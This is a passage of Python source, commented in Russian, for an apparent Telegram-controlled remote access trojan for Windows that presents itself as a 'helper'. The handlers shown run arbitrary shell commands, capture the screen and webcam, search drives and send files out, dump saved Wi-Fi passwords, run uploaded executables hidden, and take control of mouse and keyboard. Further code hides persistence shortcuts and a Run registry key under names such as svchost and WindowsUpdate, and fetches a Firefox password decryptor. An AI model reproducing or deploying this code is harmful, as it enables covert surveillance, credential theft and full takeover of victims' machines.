        context.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode='HTML')

    def cmd_help(update, context):
        text = (
            "--- 🖥️ Система ---\n"
            "/status — подробная информация о системе\n"
            "/stop — остановить и закрыть помощник\n"
            "/shutdown — выключить компьютер\n"
            "/restart — перезагрузить компьютер\n"
            "/logout — выйти из системы Windows\n"
            "/lock — заблокировать экран\n"
            "\n"
            "--- 📂 Файлы и Данные ---\n"
            "/screen — скриншот экрана\n"
            "/webcam — фото с веб-камеры\n"
            "/webcam [sec] — видео с веб-камеры (до 60 сек)\n"
            "/archive <имя_файла> [имя_2]... — найти файлы и отправить в архиве\n"
            "/wifi — получить сохраненные пароли Wi-Fi (Windows)\n"
            "/ls [path] — список файлов и папок в директории\n"
            "\n"
            "--- ⚙️ Выполнение ---\n"
            "/shell <cmd> — выполнить команду в shell\n"
            "/open_url <url> — открыть ссылку в браузере\n"
            "/run_hidden <path> — запустить программу/файл скрыто\n"
            "   (Отправьте .exe файл боту, чтобы загрузить его)\n"
            "\n"
            "--- ⌨️ Взаимодействие ---\n"
            "/mousemove <x> <y> — переместить мышь\n"
            "/mouseclick — нажать левую кнопку мыши\n"
            "/type <text> — напечатать текст\n"
            "/speak <text> — озвучить текст на компьютере\n"
            "/popup <text> — показать всплывающее окно (Windows)\n"
            "/wallpaper — сменить обои (ответом на изображение)\n"
        )
        context.bot.send_message(chat_id=update.effective_chat.id, text=text)

    def cmd_webcam(update, context):
        args = context.args
        if args and args[0].isdigit():
            seconds = int(args[0])
            if seconds < 1 or seconds > 60:
                context.bot.send_message(chat_id=update.effective_chat.id, text="Укажите время от 1 до 60 секунд")
                return
            video_path = capture_webcam(duration=seconds)
            if video_path and os.path.exists(video_path):
                with open(video_path, 'rb') as f:
                    context.bot.send_video(chat_id=update.effective_chat.id, video=f, timeout=120)
                os.remove(video_path)
            else:
                context.bot.send_message(chat_id=update.effective_chat.id, text="Не удалось записать видео с камеры")
        else:
            photo = capture_webcam()
            if photo:
                context.bot.send_photo(chat_id=update.effective_chat.id, photo=photo)
            else:
                context.bot.send_message(chat_id=update.effective_chat.id, text="Не удалось получить изображение с камеры")

    def cmd_archive(update, context):
        if not context.args:
            update.message.reply_text("Ошибка: Укажите имя или маску файла для архивации.\nПример: `/archive my_doc.txt *.jpg`", parse_mode='Markdown')
            return

        names = ' '.join(context.args).replace(',', ' ').split()
        search_paths = [
            os.path.join(os.path.expanduser('~'), 'Desktop'),
            os.path.join(os.path.expanduser('~'), 'Documents'),
            os.path.join(os.path.expanduser('~'), 'Downloads'),
            'C:\\'
        ]
        found_files = []
        for name in names:
            # Если абсолютный путь
            if os.path.isabs(name) and os.path.isfile(name):
                if name not in found_files:
                    found_files.append(name)
            else:
                # Поиск по папкам
                for base in search_paths:
                    try:
                        for root, _, files in os.walk(base):
                            for file in files:
                                # Фильтр временных/системных файлов
                                if (
                                    name.lower() in file.lower()
                                    and not file.lower().endswith('.zip')
                                    and 'temp' not in root.lower()
                                    and not file.lower().startswith('rar$')
                                    and '.rartemp' not in root.lower()
                                ):
                                    full_path = os.path.join(root, file)
                                    if full_path not in found_files:
                                        found_files.append(full_path)
                    except Exception:
                        continue # Пропускаем папки, к которым нет доступа
        if not found_files:
            update.message.reply_text("Файлы не найдены по вашему запросу.")
            return

        archive_name = f"custom_files_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        archive_path = os.path.join(OUTPUT_DIR, archive_name)
        try:
            with pyzipper.AESZipFile(archive_path, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zipf:
                zipf.setpassword(ZIP_PASSWORD.encode('utf-8'))
                for file_path in found_files:
                    zipf.write(file_path, arcname=os.path.basename(file_path))
            
            # Проверка размера и отправка
            if os.path.getsize(archive_path) > 50 * 1024 * 1024:
                context.bot.send_message(chat_id=update.effective_chat.id, text="Ошибка: Архив слишком велик для отправки (>50МБ).")
            else:
                with open(archive_path, 'rb') as archive_file:
                    context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=archive_file,
                        filename=archive_name,
                        caption=f"Архив с запрошенными файлами.\nПароль: `{ZIP_PASSWORD}`",
                        parse_mode='Markdown'
                    )
            
            os.remove(archive_path)
        except Exception as e:
            context.bot.send_message(chat_id=update.effective_chat.id, text=f"Ошибка архивации: {e}")

    def cmd_stop(update, context):
        """Останавливает бота и завершает выполнение скрипта."""
        context.bot.send_message(chat_id=update.effective_chat.id, text="Получена команда на остановку. Помощник завершает работу...")
        updater.stop()
        os._exit(0) # Принудительное завершение всего процесса

    # --- NEW COMMANDS ---
    def cmd_shutdown(update, context):
        update.message.reply_text("Executing shutdown...")
        system_shutdown()
    
    def cmd_restart(update, context):
        update.message.reply_text("Executing restart...")
        system_restart()
        
    def cmd_logout(update, context):
        result = system_logout()
        if result: # On error
            update.message.reply_text(result)
        else:
            update.message.reply_text("Executing logout...")

    def cmd_open_url(update, context):
        if not context.args:
            update.message.reply_text("Usage: /open_url <URL>")
            return
        url = context.args[0]
        if not url.startswith('http'):
            url = 'http://' + url
        open_url_in_browser(url)
        update.message.reply_text(f"Opening URL: {url}")

    def cmd_shell(update, context):
        if not context.args:
            update.message.reply_text("Usage: /shell <command>")
            return
        command = ' '.join(context.args)
        update.message.reply_text(f"Executing: {command}\n...")
        output = execute_shell_command(command)
        if len(output) > 4096:
            # Split message if too long for Telegram
            for i in range(0, len(output), 4096):
                context.bot.send_message(chat_id=update.effective_chat.id, text=output[i:i + 4096])
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text=output)

    def cmd_run_hidden(update, context):
        if not context.args:
            update.message.reply_text("Usage: /run_hidden <path_to_exe>")
            return
        path = ' '.join(context.args)
        result = run_hidden_process(path)
        update.message.reply_text(result)

    def cmd_mousemove(update, context):
        if len(context.args) != 2 or not context.args[0].isdigit() or not context.args[1].isdigit():
            update.message.reply_text("Usage: /mousemove <x> <y>")
            return
        x, y = context.args
        result = move_mouse(x, y)
        update.message.reply_text(result)

    def cmd_mouseclick(update, context):
        result = click_mouse()
        update.message.reply_text(result)

    def cmd_type(update, context):
        if not context.args:
            update.message.reply_text("Usage: /type <text to type>")
            return
        text = ' '.join(context.args)
        result = type_with_keyboard(text)
        update.message.reply_text(result)
    
    def cmd_lock(update, context):
        result = lock_workstation()
        update.message.reply_text(result)

    def cmd_speak(update, context):
        if not pyttsx3:
            update.message.reply_text("Library pyttsx3 is not installed. Please install it (`pip install pyttsx3`).")
            return
        if not context.args:
            update.message.reply_text("Usage: /speak <text to say>")
            return
        text = ' '.join(context.args)
        result = text_to_speech_speak(text)
        update.message.reply_text(result)

    def cmd_popup(update, context):
        if not context.args:
            update.message.reply_text("Usage: /popup <message text>")
            return
        text = ' '.join(context.args)
        result = show_popup_message(text)
        update.message.reply_text(result)

    def cmd_wallpaper(update, context):
        if not update.message.reply_to_message or not update.message.reply_to_message.photo:
            update.message.reply_text("Please reply to a photo to set it as wallpaper.")
            return
        
        photo = update.message.reply_to_message.photo[-1] # Get highest resolution
        file_id = photo.file_id
        photo_file = context.bot.get_file(file_id)
        
        now = datetime.now().strftime('%Y%m%d_%H%M%S')
        file_name = f"wallpaper_{now}.jpg"
        wallpaper_path = os.path.join(OUTPUT_DIR, file_name)
        
        photo_file.download(wallpaper_path)
        
        result = set_desktop_wallpaper(wallpaper_path)
        update.message.reply_text(result)
        
        # Clean up the downloaded file
        safe_remove(wallpaper_path)

    def cmd_wifi(update, context):
        update.message.reply_text("Fetching Wi-Fi passwords...")
        passwords = get_wifi_passwords_list()
        update.message.reply_text(passwords)

    def cmd_ls(update, context):
        path = ' '.join(context.args) if context.args else '.'
        result = list_files_in_directory(path)
        update.message.reply_text(f"Listing for '{os.path.abspath(path)}':\n\n{result}")

    def handle_file_upload(update, context):
        if update.message.document:
            file_obj = update.message.document
        elif update.message.audio:
            file_obj = update.message.audio
        elif update.message.video:
            file_obj = update.message.video
        else:
            return

        # Лимит API Telegram на загрузку файлов ботом - 20 МБ
        if file_obj.file_size and file_obj.file_size > 20 * 1024 * 1024:
            update.message.reply_text("Ошибка: Файл слишком большой. Максимальный размер для загрузки - 20 МБ.")
            return

        try:
            file_id = file_obj.file_id
            tg_file = context.bot.get_file(file_id)
            file_name = file_obj.file_name

            save_path = os.path.join(OUTPUT_DIR, file_name)
            tg_file.download(save_path)

            reply_text = f"Файл '{file_name}' успешно загружен в:\n`{save_path}`"

            # Если это исполняемый файл Windows, предлагаем команду /run_hidden
            if file_name.lower().endswith('.exe'):
                reply_text += f"\n\nЧтобы запустить его скрыто, используйте:\n`/run_hidden \"{save_path}\"`"

            update.message.reply_text(reply_text, parse_mode='Markdown')

        except telegram.error.BadRequest as e:
            if "file is too big" in str(e).lower():
                update.message.reply_text("Ошибка: Файл слишком большой. Максимальный размер для загрузки - 20 МБ.")
            else:
                update.message.reply_text(f"Произошла ошибка Telegram: {e}")
        except Exception as e:
            update.message.reply_text(f"Не удалось загрузить файл: {e}")

    # --- HANDLERS ---
    dp.add_handler(CommandHandler("screen", cmd_screen))
    dp.add_handler(CommandHandler("status", cmd_status))
    dp.add_handler(CommandHandler("help", cmd_help))
    dp.add_handler(CommandHandler("webcam", cmd_webcam, pass_args=True))
    dp.add_handler(CommandHandler("archive", cmd_archive, pass_args=True))
    dp.add_handler(CommandHandler("stop", cmd_stop))

    # Register new handlers
    dp.add_handler(CommandHandler("shutdown", cmd_shutdown))
    dp.add_handler(CommandHandler("restart", cmd_restart))
    dp.add_handler(CommandHandler("logout", cmd_logout))
    dp.add_handler(CommandHandler("open_url", cmd_open_url, pass_args=True))
    dp.add_handler(CommandHandler("shell", cmd_shell, pass_args=True))
    dp.add_handler(CommandHandler("run_hidden", cmd_run_hidden, pass_args=True))
    dp.add_handler(CommandHandler("mousemove", cmd_mousemove, pass_args=True))
    dp.add_handler(CommandHandler("mouseclick", cmd_mouseclick))
    dp.add_handler(CommandHandler("type", cmd_type, pass_args=True))
    dp.add_handler(CommandHandler("lock", cmd_lock))
    dp.add_handler(CommandHandler("speak", cmd_speak, pass_args=True))
    dp.add_handler(CommandHandler("popup", cmd_popup, pass_args=True))
    dp.add_handler(CommandHandler("wallpaper", cmd_wallpaper))
    dp.add_handler(CommandHandler("wifi", cmd_wifi))
    dp.add_handler(CommandHandler("ls", cmd_ls, pass_args=True))

    from telegram.ext import MessageHandler, Filters
    dp.add_handler(MessageHandler(Filters.document | Filters.audio | Filters.video, handle_file_upload))


    updater.start_polling()
    updater.idle()

def create_shortcut(target, shortcut_path, args=""):
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = target
    shortcut.Arguments = args
    shortcut.WorkingDirectory = os.path.dirname(target)
    shortcut.IconLocation = target
    shortcut.Save()
    # Сделать ярлык скрытым
    try:
        os.system(f'attrib +h +s "{shortcut_path}"')
    except Exception:
        pass

def setup_multi_autostart():
    script_path = os.path.abspath(sys.argv[0])
    exe_path = sys.executable
    # Пути для ярлыков
    startup_paths = [
        os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup'),
        r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup',
        os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Recent'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Temp'),
    ]
    shortcut_names = ['system32.lnk', 'OneDrive.lnk', 'WindowsUpdate.lnk', 'svchost.lnk']
    for path, name in zip(startup_paths, shortcut_names):
        try:
            os.makedirs(path, exist_ok=True)
            shortcut_path = os.path.join(path, name)
            create_shortcut(exe_path, shortcut_path, f'"{script_path}"')
        except Exception:
            pass
    # Запись в реестр автозапуска (HKCU)
    try:
        reg_path = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        reg_name = 'WindowsUpdateService'
        reg_value = f'"{exe_path}" "{script_path}"'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, reg_value)
    except Exception:
        pass

def ensure_firefox_decrypt():
    """Проверяет наличие firefox_decrypt и скачивает его с GitHub, если он отсутствует."""
    if os.path.exists(FIREFOX_DECRYPT_PATH) and os.path.exists(os.path.join(FIREFOX_DECRYPT_PATH, 'firefox_decrypt.py')):
        return True

    print("[INFO] Зависимость firefox_decrypt не найдена. Попытка скачать с GitHub...")
    
    if os.path.exists(FIREFOX_DECRYPT_PATH):
        try:
            shutil.rmtree(FIREFOX_DECRYPT_PATH)
        except Exception as e:
            print(f"[ERROR] Не удалось удалить неполную папку {FIREFOX_DECRYPT_PATH}: {e}")
            return False

    git_url = "https://github.com/unode/firefox_decrypt.git"
    try:
        subprocess.run(['git', '--version'], check=True, capture_output=True, text=True)
        subprocess.run(
            ['git', 'clone', '--depth', '1', git_url, FIREFOX_DECRYPT_PATH],
            check=True, capture_output=True, text=True
        )
        print(f"[SUCCESS] Зависимость firefox_decrypt успешно скачана в {FIREFOX_DECRYPT_PATH}")
        return True
    except FileNotFoundError:
        print("[ERROR] Команда 'git' не найдена. Установите Git для автоматической загрузки зависимостей.")
        return False
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Не удалось скачать firefox_decrypt с помощью git: {e.stderr.strip()}")
        return False
    except Exception as e:
        print(f"[ERROR] Произошла непредвиденная ошибка при скачивании firefox_decrypt: {e}")
        return False

def is_admin():
    """Проверяет, запущен ли скрипт с правами администратора (только для Windows)."""
    if platform.system() != "Windows":
        return True # На других ОС считаем, что права есть, или это нерелевантно.
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

# === ОСНОВНОЙ ЗАПУСК ===
def main():
    telegram_bot_thread()  # Запуск Telegram-бота в главном потоке

if __name__ == "__main__":
    main() 